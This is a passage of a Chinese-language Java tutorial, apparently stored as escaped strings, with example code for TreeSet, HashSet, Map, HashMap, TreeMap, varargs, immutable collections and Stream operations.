}\n\n      public Student(String name, int chinese, int math, int english) {\n          this.name = name;\n          this.chinese = chinese;\n          this.math = math;\n          this.english = english;\n      }\n\n      public String getName() {\n          return name;\n      }\n\n      public void setName(String name) {\n          this.name = name;\n      }\n\n      public int getChinese() {\n          return chinese;\n      }\n\n      public void setChinese(int chinese) {\n          this.chinese = chinese;\n      }\n\n      public int getMath() {\n          return math;\n      }\n\n      public void setMath(int math) {\n          this.math = math;\n      }\n\n      public int getEnglish() {\n          return english;\n      }\n\n      public void setEnglish(int english) {\n          this.english = english;\n      }\n\n      public int getSum() {\n          return this.chinese + this.math + this.english;\n      }\n\n      @Override\n      public int compareTo(Student o) {\n          // 主要条件: 按照总分进行排序\n          int result = o.getSum() - this.getSum();\n          // 次要条件: 如果总分一样,就按照语文成绩排序\n          result = result == 0 ? o.getChinese() - this.getChinese() : result;\n          // 如果语文成绩也一样,就按照数学成绩排序\n          result = result == 0 ? o.getMath() - this.getMath() : result;\n          // 如果总分一样,各科成绩也都一样,就按照姓名排序\n          result = result == 0 ? o.getName().compareTo(this.getName()) : result;\n          return result;\n      }\n  }\n  ```\n\n  测试类\n\n  ```java\n  public class TreeSetDemo {\n      public static void main(String[] args) {\n          //创建TreeSet集合对象，通过比较器排序进行排序\n          TreeSet<Student> ts = new TreeSet<Student>();\n          //创建学生对象\n          Student s1 = new Student("jack", 98, 100, 95);\n          Student s2 = new Student("rose", 95, 95, 95);\n          Student s3 = new Student("sam", 100, 93, 98);\n          //把学生对象添加到集合\n          ts.add(s1);\n          ts.add(s2);\n          ts.add(s3);\n\n          //遍历集合\n          for (Student s : ts) {\n              System.out.println(s.getName() + "," + s.getChinese() + "," + s.getMath() + "," + s.getEnglish() + "," + s.getSum());\n          }\n      }\n  }\n  ```\n\n## 4.HashSet集合\n\n### 4.1HashSet集合概述和特点【应用】\n\n+ 底层数据结构是哈希表\n+ 存取无序\n+ 不可以存储重复元素\n+ 没有索引,不能使用普通for循环遍历\n\n### 4.2HashSet集合的基本应用【应用】\n\n存储字符串并遍历\n\n```java\npublic class HashSetDemo {\n    public static void main(String[] args) {\n        //创建集合对象\n        HashSet<String> set = new HashSet<String>();\n\n        //添加元素\n        set.add("hello");\n        set.add("world");\n        set.add("java");\n        //不包含重复元素的集合\n        set.add("world");\n\n        //遍历\n        for(String s : set) {\n            System.out.println(s);\n        }\n    }\n}\n```\n\n### 4.3哈希值【理解】\n\n- 哈希值简介\n\n  ​\t是JDK根据对象的地址或者字符串或者数字算出来的int类型的数值\n\n- 如何获取哈希值\n\n  ​\tObject类中的public int hashCode()：返回对象的哈希码值\n\n- 哈希值的特点\n\n  - 同一个对象多次调用hashCode()方法返回的哈希值是相同的\n  - 默认情况下，不同对象的哈希值是不同的。而重写hashCode()方法，可以实现让不同对象的哈希值相同\n\n### 4.4哈希表结构【理解】\n\n+ JDK1.8以前\n\n  ​\t数组 + 链表\n\n  ![14_JKD8以前哈希表](./img/java/basics/day17-集合02.img/14_JKD8以前哈希表.png)\n\n+ JDK1.8以后\n\n  + 节点个数少于等于8个\n\n    ​\t数组 + 链表\n\n  + 节点个数多于8个\n\n    ​\t数组 + 红黑树\n\n  ![15_JKD8以后哈希表](./img/java/basics/day17-集合02.img/15_JKD8以后哈希表.png)\n\n### 4.5HashSet集合存储学生对象并遍历【应用】\n\n- 案例需求\n\n  - 创建一个存储学生对象的集合，存储多个学生对象，使用程序实现在控制台遍历该集合\n  - 要求：学生对象的成员变量值相同，我们就认为是同一个对象\n\n- 代码实现\n\n  学生类\n\n  ```java\n  public class Student {\n      private String name;\n      private int age;\n\n      public Student() {\n      }\n\n      public Student(String name, int age) {\n          this.name = name;\n          this.age = age;\n      }\n\n      public String getName() {\n          return name;\n      }\n\n      public void setName(String name) {\n          this.name = name;\n      }\n\n      public int getAge() {\n          return age;\n      }\n\n      public void setAge(int age) {\n          this.age = age;\n      }\n\n      @Override\n      public boolean equals(Object o) {\n          if (this == o) return true;\n          if (o == null || getClass() != o.getClass()) return false;\n\n          Student student = (Student) o;\n\n          if (age != student.age) return false;\n          return name != null ? name.equals(student.name) : student.name == null;\n      }\n\n      @Override\n      public int hashCode() {\n          int result = name != null ? name.hashCode() : 0;\n          result = 31 * result + age;\n          return result;\n      }\n  }\n  ```\n\n  测试类\n\n  ```java\n  public class HashSetDemo02 {\n      public static void main(String[] args) {\n          //创建HashSet集合对象\n          HashSet<Student> hs = new HashSet<Student>();\n\n          //创建学生对象\n          Student s1 = new Student("林青霞", 30);\n          Student s2 = new Student("张曼玉", 35);\n          Student s3 = new Student("王祖贤", 33);\n\n          Student s4 = new Student("王祖贤", 33);\n\n          //把学生添加到集合\n          hs.add(s1);\n          hs.add(s2);\n          hs.add(s3);\n          hs.add(s4);\n\n          //遍历集合(增强for)\n          for (Student s : hs) {\n              System.out.println(s.getName() + "," + s.getAge());\n          }\n      }\n  }\n  ```\n\n- 总结\n\n  ​\tHashSet集合存储自定义类型元素,要想实现元素的唯一,要求必须重写hashCode方法和equals方法',xn='## 1.Map集合\n\n### 1.1Map集合概述和特点【理解】\n\n- Map集合概述\n\n  ```java\n  interface Map<K,V>  K：键的类型；V：值的类型\n  ```\n\n- Map集合的特点\n\n  - 双列集合,一个键对应一个值\n  - 键不可以重复,值可以重复\n\n- Map集合的基本使用\n\n  ```java\n  public class MapDemo01 {\n      public static void main(String[] args) {\n          //创建集合对象\n          Map<String,String> map = new HashMap<String,String>();\n\n          //V put(K key, V value) 将指定的值与该映射中的指定键相关联\n          map.put("itheima001","林青霞");\n          map.put("itheima002","张曼玉");\n          map.put("itheima003","王祖贤");\n          map.put("itheima003","柳岩");\n\n          //输出集合对象\n          System.out.println(map);\n      }\n  }\n  ```\n\n### 1.2Map集合的基本功能【应用】\n\n- 方法介绍\n\n  | 方法名                                 | 说明                 |\n  | ----------------------------------- | ------------------ |\n  | V   put(K key,V   value)            | 添加元素               |\n  | V   remove(Object key)              | 根据键删除键值对元素         |\n  | void   clear()                      | 移除所有的键值对元素         |\n  | boolean containsKey(Object key)     | 判断集合是否包含指定的键       |\n  | boolean containsValue(Object value) | 判断集合是否包含指定的值       |\n  | boolean isEmpty()                   | 判断集合是否为空           |\n  | int size()                          | 集合的长度，也就是集合中键值对的个数 |\n\n- 示例代码\n\n  ```java\n  public class MapDemo02 {\n      public static void main(String[] args) {\n          //创建集合对象\n          Map<String,String> map = new HashMap<String,String>();\n\n          //V put(K key,V value)：添加元素\n          map.put("张无忌","赵敏");\n          map.put("郭靖","黄蓉");\n          map.put("杨过","小龙女");\n\n          //V remove(Object key)：根据键删除键值对元素\n  //        System.out.println(map.remove("郭靖"));\n  //        System.out.println(map.remove("郭襄"));\n\n          //void clear()：移除所有的键值对元素\n  //        map.clear();\n\n          //boolean containsKey(Object key)：判断集合是否包含指定的键\n  //        System.out.println(map.containsKey("郭靖"));\n  //        System.out.println(map.containsKey("郭襄"));\n\n          //boolean isEmpty()：判断集合是否为空\n  //        System.out.println(map.isEmpty());\n\n          //int size()：集合的长度，也就是集合中键值对的个数\n          System.out.println(map.size());\n\n          //输出集合对象\n          System.out.println(map);\n      }\n  }\n  ```\n\n### 1.3Map集合的获取功能【应用】\n\n- 方法介绍\n\n  | 方法名                              | 说明           |\n  | -------------------------------- | ------------ |\n  | V   get(Object key)              | 根据键获取值       |\n  | Set<K>   keySet()                | 获取所有键的集合     |\n  | Collection<V>   values()         | 获取所有值的集合     |\n  | Set<Map.Entry<K,V>>   entrySet() | 获取所有键值对对象的集合 |\n\n- 示例代码\n\n  ```java\n  public class MapDemo03 {\n      public static void main(String[] args) {\n          //创建集合对象\n          Map<String, String> map = new HashMap<String, String>();\n\n          //添加元素\n          map.put("张无忌", "赵敏");\n          map.put("郭靖", "黄蓉");\n          map.put("杨过", "小龙女");\n\n          //V get(Object key):根据键获取值\n  //        System.out.println(map.get("张无忌"));\n  //        System.out.println(map.get("张三丰"));\n\n          //Set<K> keySet():获取所有键的集合\n  //        Set<String> keySet = map.keySet();\n  //        for(String key : keySet) {\n  //            System.out.println(key);\n  //        }\n\n          //Collection<V> values():获取所有值的集合\n          Collection<String> values = map.values();\n          for(String value : values) {\n              System.out.println(value);\n          }\n      }\n  }\n  ```\n\n### 1.4Map集合的遍历(方式1)【应用】\n\n- 遍历思路\n\n  - 我们刚才存储的元素都是成对出现的，所以我们把Map看成是一个夫妻对的集合\n    - 把所有的丈夫给集中起来\n    - 遍历丈夫的集合，获取到每一个丈夫\n    - 根据丈夫去找对应的妻子\n\n- 步骤分析\n\n  - 获取所有键的集合。用keySet()方法实现\n  - 遍历键的集合，获取到每一个键。用增强for实现  \n  - 根据键去找值。用get(Object key)方法实现\n\n- 代码实现\n\n  ```java\n  public class MapDemo01 {\n      public static void main(String[] args) {\n          //创建集合对象\n          Map<String, String> map = new HashMap<String, String>();\n\n          //添加元素\n          map.put("张无忌", "赵敏");\n          map.put("郭靖", "黄蓉");\n          map.put("杨过", "小龙女");\n\n          //获取所有键的集合。用keySet()方法实现\n          Set<String> keySet = map.keySet();\n          //遍历键的集合，获取到每一个键。用增强for实现\n          for (String key : keySet) {\n              //根据键去找值。用get(Object key)方法实现\n              String value = map.get(key);\n              System.out.println(key + "," + value);\n          }\n      }\n  }\n  ```\n\n### 1.5Map集合的遍历(方式2)【应用】\n\n- 遍历思路\n\n  - 我们刚才存储的元素都是成对出现的，所以我们把Map看成是一个夫妻对的集合\n    - 获取所有结婚证的集合\n    - 遍历结婚证的集合，得到每一个结婚证\n    - 根据结婚证获取丈夫和妻子\n\n- 步骤分析\n\n  - 获取所有键值对对象的集合\n    - Set<Map.Entry<K,V>> entrySet()：获取所有键值对对象的集合\n  - 遍历键值对对象的集合，得到每一个键值对对象\n    - 用增强for实现，得到每一个Map.Entry\n  - 根据键值对对象获取键和值\n    - 用getKey()得到键\n    - 用getValue()得到值\n\n- 代码实现\n\n  ```java\n  public class MapDemo02 {\n      public static void main(String[] args) {\n          //创建集合对象\n          Map<String, String> map = new HashMap<String, String>();\n\n          //添加元素\n          map.put("张无忌", "赵敏");\n          map.put("郭靖", "黄蓉");\n          map.put("杨过", "小龙女");\n\n          //获取所有键值对对象的集合\n          Set<Map.Entry<String, String>> entrySet = map.entrySet();\n          //遍历键值对对象的集合，得到每一个键值对对象\n          for (Map.Entry<String, String> me : entrySet) {\n              //根据键值对对象获取键和值\n              String key = me.getKey();\n              String value = me.getValue();\n              System.out.println(key + "," + value);\n          }\n      }\n  }\n  ```\n\n## 2.HashMap集合\n\n### 2.1HashMap集合概述和特点【理解】\n\n+ HashMap底层是哈希表结构的\n+ 依赖hashCode方法和equals方法保证键的唯一\n+ 如果键要存储的是自定义对象，需要重写hashCode和equals方法\n\n### 2.2HashMap集合应用案例【应用】\n\n- 案例需求\n\n  - 创建一个HashMap集合，键是学生对象(Student)，值是居住地 (String)。存储多个元素，并遍历。\n  - 要求保证键的唯一性：如果学生对象的成员变量值相同，我们就认为是同一个对象\n\n- 代码实现\n\n  学生类\n\n  ```java\n  public class Student {\n      private String name;\n      private int age;\n\n      public Student() {\n      }\n\n      public Student(String name, int age) {\n          this.name = name;\n          this.age = age;\n      }\n\n      public String getName() {\n          return name;\n      }\n\n      public void setName(String name) {\n          this.name = name;\n      }\n\n      public int getAge() {\n          return age;\n      }\n\n      public void setAge(int age) {\n          this.age = age;\n      }\n\n      @Override\n      public boolean equals(Object o) {\n          if (this == o) return true;\n          if (o == null || getClass() != o.getClass()) return false;\n\n          Student student = (Student) o;\n\n          if (age != student.age) return false;\n          return name != null ? name.equals(student.name) : student.name == null;\n      }\n\n      @Override\n      public int hashCode() {\n          int result = name != null ? name.hashCode() : 0;\n          result = 31 * result + age;\n          return result;\n      }\n  }\n  ```\n\n  测试类\n\n  ```java\n  public class HashMapDemo {\n      public static void main(String[] args) {\n          //创建HashMap集合对象\n          HashMap<Student, String> hm = new HashMap<Student, String>();\n\n          //创建学生对象\n          Student s1 = new Student("林青霞", 30);\n          Student s2 = new Student("张曼玉", 35);\n          Student s3 = new Student("王祖贤", 33);\n          Student s4 = new Student("王祖贤", 33);\n\n          //把学生添加到集合\n          hm.put(s1, "西安");\n          hm.put(s2, "武汉");\n          hm.put(s3, "郑州");\n          hm.put(s4, "北京");\n\n          //遍历集合\n          Set<Student> keySet = hm.keySet();\n          for (Student key : keySet) {\n              String value = hm.get(key);\n              System.out.println(key.getName() + "," + key.getAge() + "," + value);\n          }\n      }\n  }\n  ```\n\n## 3.TreeMap集合\n\n### 3.1TreeMap集合概述和特点【理解】\n\n+ TreeMap底层是红黑树结构\n+ 依赖自然排序或者比较器排序,对键进行排序\n+ 如果键存储的是自定义对象,需要实现Comparable接口或者在创建TreeMap对象时候给出比较器排序规则\n\n### 3.2TreeMap集合应用案例一【应用】\n\n+ 案例需求\n\n  + 创建一个TreeMap集合,键是学生对象(Student),值是籍贯(String),学生属性姓名和年龄,按照年龄进行排序并遍历\n  + 要求按照学生的年龄进行排序,如果年龄相同则按照姓名进行排序\n\n+ 代码实现\n\n  学生类\n\n  ```java\n  public class Student implements Comparable<Student>{\n      private String name;\n      private int age;\n\n      public Student() {\n      }\n\n      public Student(String name, int age) {\n          this.name = name;\n          this.age = age;\n      }\n\n      public String getName() {\n          return name;\n      }\n\n      public void setName(String name) {\n          this.name = name;\n      }\n\n      public int getAge() {\n          return age;\n      }\n\n      public void setAge(int age) {\n          this.age = age;\n      }\n\n      @Override\n      public String toString() {\n          return "Student{" +\n                  "name=\'" + name + \'\\\'\' +\n                  ", age=" + age +\n                  \'}\';\n      }\n\n      @Override\n      public int compareTo(Student o) {\n          //按照年龄进行排序\n          int result = o.getAge() - this.getAge();\n          //次要条件，按照姓名排序。\n          result = result == 0 ? o.getName().compareTo(this.getName()) : result;\n          return result;\n      }\n  }\n  ```\n\n  测试类\n\n  ```java\n  public class Test1 {\n      public static void main(String[] args) {\n        \t// 创建TreeMap集合对象\n          TreeMap<Student,String> tm = new TreeMap<>();\n        \n  \t\t// 创建学生对象\n          Student s1 = new Student("xiaohei",23);\n          Student s2 = new Student("dapang",22);\n          Student s3 = new Student("xiaomei",22);\n        \n  \t\t// 将学生对象添加到TreeMap集合中\n          tm.put(s1,"江苏");\n          tm.put(s2,"北京");\n          tm.put(s3,"天津");\n        \n  \t\t// 遍历TreeMap集合,打印每个学生的信息\n          tm.forEach(\n                  (Student key, String value)->{\n                      System.out.println(key + "---" + value);\n                  }\n          );\n      }\n  }\n  ```\n\n### 3.3TreeMap集合应用案例二【应用】\n\n- 案例需求\n\n  - 给定一个字符串,要求统计字符串中每个字符出现的次数。\n  - 举例: 给定字符串是“aababcabcdabcde”,在控制台输出: “a(5)b(4)c(3)d(2)e(1)”\n\n- 代码实现\n\n  ```java\n  public class Test2 {\n      public static void main(String[] args) {\n        \t// 给定字符串\n          String s = "aababcabcdabcde";\n  \t\t// 创建TreeMap集合对象,键是Character,值是Integer\n          TreeMap<Character,Integer> tm = new TreeMap<>();\n\n          //遍历字符串，得到每一个字符\n          for (int i = 0; i < s.length(); i++) {\n              //c依次表示字符串中的每一个字符\n              char c = s.charAt(i);\n            \t// 判断当前遍历到的字符是否在集合中出现过\n              if(!tm.containsKey(c)){\n                  //表示当前字符是第一次出现。\n                  tm.put(c,1);\n              }else{\n                  //存在，表示当前字符已经出现过了\n                  //先获取这个字符已经出现的次数\n                  Integer count = tm.get(c);\n                  //自增，表示这个字符又出现了依次\n                  count++;\n                  //将自增后的结果再次添加到集合中。\n                  tm.put(c,count);\n              }\n          }\n          //  a（5）b（4）c（3）d（2）e（1）\n          //System.out.println(tm);\n          tm.forEach(\n                  (Character key,Integer value)->{\n                      System.out.print(key + "（" + value + "）");\n                  }\n          );\n      }\n  }\n  ```\n\n## 4.可变参数\n\n### 4.1可变参数【应用】\n\n- 可变参数介绍\n\n  - 可变参数又称参数个数可变，用作方法的形参出现，那么方法参数个数就是可变的了\n  - 方法的参数类型已经确定,个数不确定,我们可以使用可变参数\n\n- 可变参数定义格式\n\n  ```java\n  修饰符 返回值类型 方法名(数据类型… 变量名) {  }\n  ```\n\n- 可变参数的注意事项\n\n  - 这里的变量其实是一个数组\n  - 如果一个方法有多个参数，包含可变参数，可变参数要放在最后\n\n- 可变参数的基本使用\n\n  ```java\n  public class ArgsDemo01 {\n      public static void main(String[] args) {\n          System.out.println(sum(10, 20));\n          System.out.println(sum(10, 20, 30));\n          System.out.println(sum(10, 20, 30, 40));\n\n          System.out.println(sum(10,20,30,40,50));\n          System.out.println(sum(10,20,30,40,50,60));\n          System.out.println(sum(10,20,30,40,50,60,70));\n          System.out.println(sum(10,20,30,40,50,60,70,80,90,100));\n      }\n\n  //    public static int sum(int b,int... a) {\n  //        return 0;\n  //    }\n\n      public static int sum(int... a) {\n          int sum = 0;\n          for(int i : a) {\n              sum += i;\n          }\n          return sum;\n      }\n  }\n  ```\n\n### 4.2创建不可变集合【理解】\n\n+ 方法介绍\n\n  + 在List、Set、Map接口中,都存在of方法,可以创建一个不可变的集合\n    + 这个集合不能添加,不能删除,不能修改\n    + 但是可以结合集合的带参构造,实现集合的批量添加\n  + 在Map接口中,还有一个ofEntries方法可以提高代码的阅读性\n    + 首先会把键值对封装成一个Entry对象,再把这个Entry对象添加到集合当中\n\n+ 示例代码\n\n  ```java\n  public class MyVariableParameter4 {\n      public static void main(String[] args) {\n          // static <E>  List<E>  of(E…elements)  创建一个具有指定元素的List集合对象\n          //static <E>  Set<E>  of(E…elements)    创建一个具有指定元素的Set集合对象\n          //static <K , V>   Map<K，V>  of(E…elements) 创建一个具有指定元素的Map集合对象\n\n          //method1();\n          //method2();\n          //method3();\n          //method4();\n\n      }\n\n      private static void method4() {\n          Map<String, String> map = Map.ofEntries(\n                  Map.entry("zhangsan", "江苏"),\n                  Map.entry("lisi", "北京"));\n          System.out.println(map);\n      }\n\n      private static void method3() {\n          Map<String, String> map = Map.of("zhangsan", "江苏", "lisi", "北京", "wangwu", "天津");\n          System.out.println(map);\n      }\n\n      private static void method2() {\n          //传递的参数当中，不能存在重复的元素。\n          Set<String> set = Set.of("a", "b", "c", "d","a");\n          System.out.println(set);\n      }\n\n      private static void method1() {\n          List<String> list = List.of("a", "b", "c", "d");\n          System.out.println(list);\n          //list.add("Q");\n          //list.remove("a");\n          //list.set(0,"A");\n          //System.out.println(list);\n\n  //        ArrayList<String> list2 = new ArrayList<>();\n  //        list2.add("aaa");\n  //        list2.add("aaa");\n  //        list2.add("aaa");\n  //        list2.add("aaa");\n\n          //集合的批量添加。\n          //首先是通过调用List.of方法来创建一个不可变的集合，of方法的形参就是一个可变参数。\n          //再创建一个ArrayList集合，并把这个不可变的集合中所有的数据，都添加到ArrayList中。\n          ArrayList<String> list3 = new ArrayList<>(List.of("a", "b", "c", "d"));\n          System.out.println(list3);\n      }\n  }\n  ```\n\n## 5.Stream流\n\n### 5.1体验Stream流【理解】\n\n- 案例需求\n\n  按照下面的要求完成集合的创建和遍历\n\n  - 创建一个集合，存储多个字符串元素\n  - 把集合中所有以"张"开头的元素存储到一个新的集合\n  - 把"张"开头的集合中的长度为3的元素存储到一个新的集合\n  - 遍历上一步得到的集合\n\n- 原始方式示例代码\n\n  ```java\n  public class StreamDemo {\n      public static void main(String[] args) {\n          //创建一个集合，存储多个字符串元素\n          ArrayList<String> list = new ArrayList<String>();\n\n          list.add("林青霞");\n          list.add("张曼玉");\n          list.add("王祖贤");\n          list.add("柳岩");\n          list.add("张敏");\n          list.add("张无忌");\n\n          //把集合中所有以"张"开头的元素存储到一个新的集合\n          ArrayList<String> zhangList = new ArrayList<String>();\n\n          for(String s : list) {\n              if(s.startsWith("张")) {\n                  zhangList.add(s);\n              }\n          }\n\n  //        System.out.println(zhangList);\n\n          //把"张"开头的集合中的长度为3的元素存储到一个新的集合\n          ArrayList<String> threeList = new ArrayList<String>();\n\n          for(String s : zhangList) {\n              if(s.length() == 3) {\n                  threeList.add(s);\n              }\n          }\n\n  //        System.out.println(threeList);\n\n          //遍历上一步得到的集合\n          for(String s : threeList) {\n              System.out.println(s);\n          }\n          System.out.println("--------");\n\n          //Stream流来改进\n  //        list.stream().filter(s -> s.startsWith("张")).filter(s -> s.length() == 3).forEach(s -> System.out.println(s));\n          list.stream().filter(s -> s.startsWith("张")).filter(s -> s.length() == 3).forEach(System.out::println);\n      }\n  }\n  ```\n\n- 使用Stream流示例代码\n\n  ```java\n  public class StreamDemo {\n      public static void main(String[] args) {\n          //创建一个集合，存储多个字符串元素\n          ArrayList<String> list = new ArrayList<String>();\n\n          list.add("林青霞");\n          list.add("张曼玉");\n          list.add("王祖贤");\n          list.add("柳岩");\n          list.add("张敏");\n          list.add("张无忌");\n\n          //Stream流来改进\n          list.stream().filter(s -> s.startsWith("张")).filter(s -> s.length() == 3).forEach(System.out::println);\n      }\n  }\n  ```\n\n- Stream流的好处\n\n  - 直接阅读代码的字面意思即可完美展示无关逻辑方式的语义：获取流、过滤姓张、过滤长度为3、逐一打印\n  - Stream流把真正的函数式编程风格引入到Java中\n  - 代码简洁\n\n### 5.2Stream流的常见生成方式【应用】\n\n- Stream流的思想\n\n  ![01_Stream流思想](./img/java/basics/day18-集合03.img/01_Stream流思想.png)\n\n- Stream流的三类方法\n\n  + 获取Stream流\n    + 创建一条流水线,并把数据放到流水线上准备进行操作\n  + 中间方法\n    + 流水线上的操作\n    + 一次操作完毕之后,还可以继续进行其他操作\n  + 终结方法\n    + 一个Stream流只能有一个终结方法\n    + 是流水线上的最后一个操作\n\n- 生成Stream流的方式\n\n  - Collection体系集合\n\n    使用默认方法stream()生成流， default Stream<E> stream()\n\n  - Map体系集合\n\n    把Map转成Set集合，间接的生成流\n\n  - 数组\n\n    通过Arrays中的静态方法stream生成流\n\n  - 同种数据类型的多个数据\n\n    通过Stream接口的静态方法of(T... values)生成流\n\n- 代码演示\n\n  ```java\n  public class StreamDemo {\n      public static void main(String[] args) {\n          //Collection体系的集合可以使用默认方法stream()生成流\n          List<String> list = new ArrayList<String>();\n          Stream<String> listStream = list.stream();\n\n          Set<String> set = new HashSet<String>();\n          Stream<String> setStream = set.stream();\n\n          //Map体系的集合间接的生成流\n          Map<String,Integer> map = new HashMap<String, Integer>();\n          Stream<String> keyStream = map.keySet().stream();\n          Stream<Integer> valueStream = map.values().stream();\n          Stream<Map.Entry<String, Integer>> entryStream = map.entrySet().stream();\n\n          //数组可以通过Arrays中的静态方法stream生成流\n          String[] strArray = {"hello","world","java"};\n          Stream<String> strArrayStream = Arrays.stream(strArray);\n        \n        \t//同种数据类型的多个数据可以通过Stream接口的静态方法of(T... values)生成流\n          Stream<String> strArrayStream2 = Stream.of("hello", "world", "java");\n          Stream<Integer> intStream = Stream.of(10, 20, 30);\n      }\n  }\n  ```\n\n### 5.3Stream流中间操作方法【应用】\n\n- 概念\n\n  中间操作的意思是,执行完此方法之后,Stream流依然可以继续执行其他操作\n\n- 常见方法\n\n  | 方法名                                      | 说明                                       |\n  | ---------------------------------------- | ---------------------------------------- |\n  | Stream<T> filter(Predicate predicate)    | 用于对流中的数据进行过滤                             |\n  | Stream<T> limit(long maxSize)            | 返回此流中的元素组成的流，截取前指定参数个数的数据                |\n  | Stream<T> skip(long n)                   | 跳过指定参数个数的数据，返回由该流的剩余元素组成的流               |\n  | static <T> Stream<T> concat(Stream a, Stream b) | 合并a和b两个流为一个流                             |\n  | Stream<T> distinct()                     | 返回由该流的不同元素（根据Object.equals(Object) ）组成的流 |\n\n- filter代码演示\n\n  ```java\n  public class StreamDemo01 {\n      public static void main(String[] args) {\n          //创建一个集合，存储多个字符串元素\n          ArrayList<String> list = new ArrayList<String>();\n\n          list.add("林青霞");\n          list.add("张曼玉");\n          list.add("王祖贤");\n          list.add("柳岩");\n          list.add("张敏");\n          list.add("张无忌");\n\n          //需求1：把list集合中以张开头的元素在控制台输出\n          list.stream().filter(s -> s.startsWith("张")).forEach(System.out::println);\n          System.out.println("--------");\n\n          //需求2：把list集合中长度为3的元素在控制台输出\n          list.stream().filter(s -> s.length() == 3).forEach(System.out::println);\n          System.out.println("--------");\n\n          //需求3：把list集合中以张开头的，长度为3的元素在控制台输出\n          list.stream().filter(s -> s.startsWith("张")).filter(s -> s.length() == 3).forEach(System.out::println);\n      }\n  }\n  ```\n\n- limit&skip代码演示\n\n  ```java\n  public class StreamDemo02 {\n      public static void main(String[] args) {\n          //创建一个集合，存储多个字符串元素\n          ArrayList<String> list = new ArrayList<String>();\n\n          list.add("林青霞");\n          list.add("张曼玉");\n          list.add("王祖贤");\n          list.add("柳岩");\n          list.add("张敏");\n          list.add("张无忌");\n\n          //需求1：取前3个数据在控制台输出\n          list.stream().limit(3).forEach(System.out::println);\n          System.out.println("--------");\n\n          //需求2：跳过3个元素，把剩下的元素在控制台输出\n          list.stream().skip(3).forEach(System.out::println);\n          System.out.println("--------");\n\n          //需求3：跳过2个元素，把剩下的元素中前2个在控制台输出\n          list.stream().skip(2).limit(2).forEach(System.out::println);\n      }\n  }\n  ```\n\n- concat&distinct代码演示\n\n  ```java\n  public class StreamDemo03 {\n      public static void main(String[] args) {\n          //创建一个集合，存储多个字符串元素\n          ArrayList<String> list = new ArrayList<String>();\n\n          list.add("林青霞");\n          list.add("张曼玉");\n          list.add("王祖贤");\n          list.add("柳岩");\n          list.add("张敏");\n          list.add("张无忌");\n\n          //需求1：取前4个数据组成一个流\n          Stream<String> s1 = list.stream().limit(4);\n\n          //需求2：跳过2个数据组成一个流\n          Stream<String> s2 = list.stream().skip(2);\n\n          //需求3：合并需求1和需求2得到的流，并把结果在控制台输出\n  //        Stream.concat(s1,s2).forEach(System.out::println);\n\n          //需求4：合并需求1和需求2得到的流，并把结果在控制台输出，要求字符串元素不能重复\n          Stream.concat(s1,s2).distinct().forEach(System.out::println);\n      }\n  }\n  ```\n\n### 5.4Stream流终结操作方法【应用】\n\n- 概念\n\n  终结操作的意思是,执行完此方法之后,Stream流将不能再执行其他操作\n\n- 常见方法\n\n  | 方法名                           | 说明           |\n  | ----------------------------- | ------------ |\n  | void forEach(Consumer action) | 对此流的每个元素执行操作 |\n  | long count()                  | 返回此流中的元素数    |\n\n- 代码演示\n\n  ```java\n  public class StreamDemo {\n      public static void main(String[] args) {\n          //创建一个集合，存储多个字符串元素\n          ArrayList<String> list = new ArrayList<String>();\n\n          list.add("林青霞");\n          list.add("张曼玉");\n          list.add("王祖贤");\n          list.add("柳岩");\n          list.add("张敏");\n          list.add("张无忌");\n\n          //需求1：把集合中的元素在控制台输出\n  //        list.stream().forEach(System.out::println);\n\n          //需求2：统计集合中有几个以张开头的元素，并把统计结果在控制台输出\n          long count = list.stream().filter(s -> s.startsWith("张")).count();\n          System.out.println(count);\n      }\n  }\n  ```\n\n### 5.5Stream流的收集操作【应用】\n\n- 概念\n\n  对数据使用Stream流的方式操作完毕后,可以把流中的数据收集到集合中\n\n- 常用方法\n\n  | 方法名                            | 说明        |\n  | ------------------------------ | --------- |\n  | R collect(Collector collector) | 把结果收集到集合中 |\n\n- 工具类Collectors提供了具体的收集方式\n\n  | 方法名                                      | 说明            |\n  | ---------------------------------------- | ------------- |\n  | public static <T> Collector toList()     | 把元素收集到List集合中 |\n  | public static <T> Collector toSet()      | 把元素收集到Set集合中  |\n  | public static  Collector toMap(Function keyMapper,Function valueMapper) | 把元素收集到Map集合中  |\n\n- 代码演示\n\n  ```java\n  public class CollectDemo {\n      public static void main(String[] args) {\n          //创建List集合对象\n          List<String> list = new ArrayList<String>();\n          list.add("林青霞");\n          list.add("张曼玉");\n          list.add("王祖贤");\n          list.add("柳岩");\n\n          /*\n          //需求1：得到名字为3个字的流\n          Stream<String> listStream = list.stream().filter(s -> s.length() == 3);\n\n          //需求2：把使用Stream流操作完毕的数据收集到List集合中并遍历\n          List<String> names = listStream.collect(Collectors.toList());\n          for(String name : names) {\n              System.out.println(name);\n          }\n          */\n\n          //创建Set集合对象\n          Set<Integer> set = new HashSet<Integer>();\n          set.add(10);\n          set.add(20);\n          set.add(30);\n          set.add(33);\n          set.add(35);\n\n          /*\n          //需求3：得到年龄大于25的流\n          Stream<Integer> setStream = set.stream().filter(age -> age > 25);\n\n          //需求4：把使用Stream流操作完毕的数据收集到Set集合中并遍历\n          Set<Integer> ages = setStream.collect(Collectors.toSet());\n          for(Integer age : ages) {\n              System.out.println(age);\n          }\n          */\n          //定义一个字符串数组，每一个字符串数据由姓名数据和年龄数据组合而成\n          String[] strArray = {"林青霞,30", "张曼玉,35", "王祖贤,33", "柳岩,25"};\n\n          //需求5：得到字符串中年龄数据大于28的流\n          Stream<String> arrayStream = Stream.of(strArray).filter(s -> Integer.parseInt(s.split(",")[1]) > 28);\n\n          //需求6：把使用Stream流操作完毕的数据收集到Map集合中并遍历，字符串中的姓名作键，年龄作值\n          Map<String, Integer> map = arrayStream.collect(Collectors.toMap(s -> s.split(",")[0], s -> Integer.parseInt(s.split(",")[1])));\n\n          Set<String> keySet = map.keySet();\n          for (String key : keySet) {\n              Integer value = map.get(key);\n              System.out.println(key + "," + value);\n          }\n      }\n  }\n  ```\n\n### 5.6Stream流综合练习【应用】\n\n- 案例需求\n\n  现在有两个ArrayList集合，分别存储6名男演员名称和6名女演员名称，要求完成如下的操作\n\n  - 男演员只要名字为3个字的前三人\n  - 女演员只要姓林的，并且不要第一个\n  - 把过滤后的男演员姓名和女演员姓名合并到一起\n  - 把上一步操作后的元素作为构造方法的参数创建演员对象,遍历数据\n\n  演员类Actor已经提供，里面有一个成员变量，一个带参构造方法，以及成员变量对应的get/set方法\n\n- 代码实现\n\n  演员类\n\n  ```java\n  public class Actor {\n      private String name;\n\n      public Actor(String name) {\n          this.name = name;\n      }\n\n      public String getName() {\n          return name;\n      }\n\n      public void setName(String name) {\n          this.name = name;\n      }\n  